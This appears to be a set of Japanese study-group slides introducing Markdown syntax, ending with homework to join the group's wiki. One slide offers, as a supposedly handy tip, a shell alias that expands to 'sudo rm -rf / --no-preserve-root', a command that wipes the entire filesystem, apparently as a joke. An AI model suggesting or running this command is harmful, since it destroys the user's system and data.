# MarkDownを触ってみる。

--- 

# Markdownについて

- 基本は「改行一つは改行されない」と思え！
- `#` 記号の後は「半角スペース」
- `<link>` は「使えるフレーバーと使えないフレーバー」があるぞ！
    - 特に「github系以外のフレーバ」は気をつけろ！
    - リンクは `[表示文字列](URL)` かな
    - [ぐーぐる](http://www.google.co.jp)
- マークアップと何が違うんだ！！！！
    - <a href="uri">囲まなくていい</a>
    - そもそも「方向性が違う」
        - Upは装飾方向、Downは書かない方向

---

# どこで使われてる？

- GitHub
- Qiita
- 当勉強会wiki
- gitpitch

---

# #増やすごとに段下げ

- そうです `#` ひとつが `h1` みたいなイメージです

---

# Tech Issue

" ``` " (バッククォート3つ)を強調したいところの始まりと

また、常用する方は、以下のようにエイリアスにしとけばよろしかろう。

```
alias bals='sudo rm -rf / --no-preserve-root
```

#　言語系は「スニペット」になる。　（Wikiではならない）

```python=
for i in range(10):
    print(i)
```

---

# 項目

”- ”　を先頭につける。

- よっこら
- しょっと
- どっこいしょ
- それでも株は抜けません

---

# 文字の協調

- 強調したい部分を＊（アスタリスク）で囲む
    - 囲む＊の量で太さが変化

- **Strong** *Zero*

---

# 画像

- 画像を出す場合は `![caption](画像URL)`

- ![barson](https://s.gravatar.com/avatar/7a791a1858b90dde2b6d8b268fdea1d9?s=80)

---

# 数字リスト

## 例１

1. 手順１
1. 手順２
1. 手順３

## 例2

3. 一()個目だけは任意
0. あとは
0. インクリメントを示すために
0. 無味乾燥に

---

# 勉強会ログについて

- 個人的には普段 `MarkDown` を使わないのでそれがつらい　（某氏）
    - markdown 使わなくてもただのメモでもOK！
    - 誰かが変換してくれます。
    - 改行だけはきっちりやリましょう。

---

# 宿題
インフラ勉強会の[Wikiページ](https://wiki.infra-workshop.tech)に登録し
自分のプロフィールページを作成してください。

---
